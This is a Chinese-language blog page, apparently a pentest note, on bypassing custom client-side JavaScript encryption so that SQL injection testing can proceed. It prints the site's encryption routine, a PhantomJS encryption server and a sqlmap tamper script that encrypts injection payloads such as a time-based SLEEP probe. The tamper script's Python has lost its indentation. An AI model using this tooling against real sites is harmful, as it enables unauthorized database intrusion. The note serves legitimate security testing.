@@ -1,0 +1,291 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>JS加密注入绕过小技巧｜Linux 与 Shell / 日常运维｜BEN.OPS</title>
+  <meta name="description" content="JS加密注入绕过小技巧。本文属于Linux 与 Shell / 日常运维，在日常渗透工作中遇到网站相关参数使用了自实现的加密。 想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。 使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字…">
+  <meta name="keywords" content="Linux 与 Shell，日常运维，Java，SQL注入，知识笔记，Linux 与 Shell / 日常运维，JS加密注入绕过小技巧，Linux，Shell">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/201905301116-Linux%20%E4%B8%8E%20Shell%2B%E6%97%A5%E5%B8%B8%E8%BF%90%E7%BB%B4%2BJava%2BSQL%E6%B3%A8%E5%85%A5-JS%E5%8A%A0%E5%AF%86%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="JS加密注入绕过小技巧">
+  <meta property="og:description" content="JS加密注入绕过小技巧。本文属于Linux 与 Shell / 日常运维，在日常渗透工作中遇到网站相关参数使用了自实现的加密。 想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。 使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html">
+  <meta property="article:published_time" content="2019-05-30T11:16:00">
+  <meta property="article:modified_time" content="2019-05-30 11:16">
+  <meta property="article:section" content="Linux 与 Shell / 日常运维">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  <meta property="og:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/385b42252f188a89c1.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="JS加密注入绕过小技巧">
+  <meta name="twitter:description" content="JS加密注入绕过小技巧。本文属于Linux 与 Shell / 日常运维，在日常渗透工作中遇到网站相关参数使用了自实现的加密。 想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。 使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字…">
+  <meta name="twitter:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/385b42252f188a89c1.png">
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html#article","headline":"JS加密注入绕过小技巧","description":"JS加密注入绕过小技巧。本文属于Linux 与 Shell / 日常运维，在日常渗透工作中遇到网站相关参数使用了自实现的加密。 想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。 使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字…","datePublished":"2019-05-30T11:16:00","dateModified":"2019-05-30 11:16","inLanguage":"zh-CN","articleSection":["Linux 与 Shell","日常运维"],"keywords":["Linux 与 Shell","日常运维","Java","SQL注入","知识笔记","Linux 与 Shell / 日常运维","JS加密注入绕过小技巧","Linux","Shell"],"wordCount":899,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"},"image":["https://ben2023niao.github.io/ben-ops-notes/doc/media/385b42252f188a89c1.png"]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Linux 与 Shell / 日常运维","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"JS加密注入绕过小技巧","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Linux 与 Shell / 日常运维</span> › <span>JS加密注入绕过小技巧</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Linux 与 Shell / 日常运维</div>
+      <h1>JS加密注入绕过小技巧</h1>
+      <p class="lede">JS加密注入绕过小技巧。本文属于Linux 与 Shell / 日常运维，在日常渗透工作中遇到网站相关参数使用了自实现的加密。 想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。 使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字…</p>
+      <div class="meta">
+        <time class="badge" datetime="2019-05-30T11:16:00">发布于 2019-05-30</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">899 字</span>
+        <span class="badge">3 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<p>在日常渗透工作中遇到网站相关参数使用了自实现的加密。
+<img alt="文档配图" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/385b42252f188a89c1.png"/></p>
+<p>想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。</p>
+<p>使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字符串进行加密。节省大量时间不需要对算法使用python进行重新编写。</p>
+<p>JavaScript加密算法</p>
+<p>展开源码</p>
+<pre><code>function encode16(str){
+ str=str.toLowerCase();
+ if (str.match(/^[-+]?\d*$/) == null){//非整数字符，对每一个字符都转换成16进制，然后拼接
+ var s=str.split("");
+ var temp="";
+ for(var i=0;i&lt;s.length;i++){
+ s[i]=s[i].charCodeAt();//先转换成Unicode编码
+ s[i]=s[i].toString(16);
+ temp=temp+s[i];
+ }
+ return temp+"{"+1;//1代表字符
+ }else{//数字直接转换成16进制
+ str=parseInt(str).toString(16);
+ }
+ return str+"{"+0;//0代表纯数字
+}
+
+function produceRandom(n){
+ var num="";
+ for(var i=0;i&lt;n;i++)
+ {
+ num+=Math.floor(Math.random()*10);
+ }
+ return num;
+}
+
+//主加密函数
+function encrypt(str){
+ var encryptStr="";//最终返回的加密后的字符串
+ encryptStr+=produceRandom(3);//产生3位随机数
+
+ var temp=encode16(str).split("{");//对要加密的字符转换成16进制
+ var numLength=temp[0].length;//转换后的字符长度
+ numLength=numLength.toString(16);//字符长度换算成16进制
+ if(numLength.length==1){//如果是1，补一个0
+ numLength="0"+numLength;
+ }else if(numLength.length&gt;2){//转换后的16进制字符长度如果大于2位数，则返回，不支持
+ return "";
+ }
+ encryptStr+=numLength;
+
+ if(temp[1]=="0"){
+ encryptStr+=0;
+ }else if(temp[1]=="1"){
+ encryptStr+=1;
+ }
+
+ encryptStr+=temp[0];
+
+ if(encryptStr.length&lt;20){//如果小于20位，补上随机数
+ var ran=produceRandom(20-encryptStr.length);
+ encryptStr+=ran;
+ }
+ return encryptStr;
+}
+</code></pre>
+<p>phantomjs_server.js</p>
+<p>展开源码</p>
+<pre><code class="language-sql">/**
+ * author: c0ny1
+ * date: 2017-12-16
+ * last update: 2019-5-30 11:16
+ */
+var fs = require('fs');
+var logfile = 'jsEncrypter.log';
+var webserver = require('webserver');
+server = webserver.create();
+var host = '203.0.113.1';
+var port = '1664';
+// 加载实现加密算法的js脚本
+var wasSuccessful = phantom.injectJs('encrypt.js');/*引入实现加密的js文件*/
+// 处理函数
+function js_encrypt(payload){
+ //var newpayload;
+ /**********在这里编写调用加密函数进行加密的代码************/
+ var newpayload = encrypt(payload);
+ /**********************************************************/
+ return newpayload;
+}
+if(wasSuccessful){
+ console.log("[*] load js successful");
+ console.log("[!] ^_^");
+ console.log("[*] jsEncrypterJS start!");
+ console.log("[+] address: http://"+host+":"+port);
+}else{
+ console.log('[*] load js fail!');
+}
+var service = server.listen(host+':'+port,function(request, response){
+ try{
+ if(request.method == 'POST'){
+ var payload = request.post['payload'];
+ var encrypt_payload = js_encrypt(payload);
+ var log = payload + ':::' + encrypt_payload;
+ console.log('[+] ' + log);
+ fs.write(logfile,log + '\n', 'w+');
+ response.statusCode = 200;
+ response.write(encrypt_payload.toString());
+ response.close();
+ }else{
+ response.statusCode = 200;
+ response.write("^_^\n\rhello jsEncrypter!");
+ response.close();
+ }
+ }catch(e){
+ //console.log('[Error]'+e.message+' happen '+e.line+'line');
+ console.log('\n-----------------Error Info--------------------')
+ var fullMessage = "Message: "+e.toString() + ':'+ e.line;
+ for (var p in e) {
+ fullMessage += "\n" + p.toUpperCase() + ": " + e[p];
+ }
+ console.log(fullMessage);
+ console.log('---------------------------------------------')
+ console.log('[*] phantomJS exit!')
+ phantom.exit();
+ }
+});
+</code></pre>
+<p>启动tools</p>
+<p>phantomjs.exe phantomjs_server.js
+<img alt="文档配图" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/9df2d3663ce26ba5cd.png"/>
+编写Sqlmap tamper脚本</p>
+<pre><code class="language-python">#!/usr/bin/env python
+"""
+Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""
+from lib.core.convert import encodeBase64
+from lib.core.enums import PRIORITY
+import requests
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def enpayload(payload):
+burp0_url = "http://203.0.113.1:1664/"
+burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}
+burp0_data = {"payload": payload}
+res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,timeout=5)
+return res.text
+def tamper(payload, **kwargs):
+ """
+    调用phantomjs的web服务对payload进行加密发送
+    &gt;&gt;&gt; tamper("1' AND SLEEP(5)#")
+    '8850207b695707800110'
+    """
+return enpayload("2021"+payload) if payload else payload
+</code></pre>
+<p>Sqlmap调用脚本进行注入
+<img alt="文档配图" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/018cc89a9739333d53.png"/></p>
+      </article>
+      <aside class="aside">
+        
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Linux 与 Shell / 日常运维</li>
+          <li>日期：2019-05-30</li>
+          <li>标签：<span class="tag">Linux 与 Shell</span><span class="tag">日常运维</span><span class="tag">Java</span><span class="tag">SQL注入</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：03-安全运营与应急/07-工作运维离线知识库/08-运维技巧/birdben/68657798.html</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/201905301116-Linux%20%E4%B8%8E%20Shell%2B%E6%97%A5%E5%B8%B8%E8%BF%90%E7%BB%B4%2BJava%2BSQL%E6%B3%A8%E5%85%A5-JS%E5%8A%A0%E5%AF%86%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>JS加密注入绕过小技巧。本文属于Linux 与 Shell / 日常运维，在日常渗透工作中遇到网站相关参数使用了自实现的加密。 想要对其进行注入测试的话需要对其算法进行逆向解密，然后再进行注入。 使用phantomjs+jsEncrypter项目中phantomjs_server.js 起个数据加密接口对需要的字…</p>
+      <p>关键词：Linux 与 Shell、日常运维、Java、SQL注入、知识笔记、Linux 与 Shell / 日常运维、JS加密注入绕过小技巧、Linux、Shell</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-6b5e1e806fc2.html"><small>上一篇</small>四 传统方式 测试副本集故障转移功能</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-847e3d1bed28.html"><small>下一篇</small>BTC节点错误解决方法</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c13da92bdde8.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
